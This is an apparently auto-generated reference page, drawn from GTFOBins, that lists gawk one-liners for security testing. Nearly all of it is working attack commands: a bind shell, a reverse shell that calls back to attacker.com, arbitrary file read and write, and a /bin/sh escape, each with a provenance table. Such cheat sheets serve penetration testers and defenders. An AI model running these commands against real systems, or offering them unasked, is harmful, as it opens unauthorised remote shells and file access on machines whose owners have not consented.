---
parsed_by: focuslocust
source: commands
type: generated
---
# gawk Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## gawk

Tool page: [gawk](../../tools/linux/gawk.md)

### bind-shell

```text
gawk 'BEGIN {
    s = "/inet/tcp/12345/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gawk` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
gawk '//' /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gawk` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gawk` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
gawk 'BEGIN {
    s = "/inet/tcp/0/attacker.com/12345";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gawk` |
| Evidence | Function example preserved from source parser. |

### shell

```text
gawk 'BEGIN {system("/bin/sh")}'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gawk` |
| Evidence | Function example preserved from source parser. |
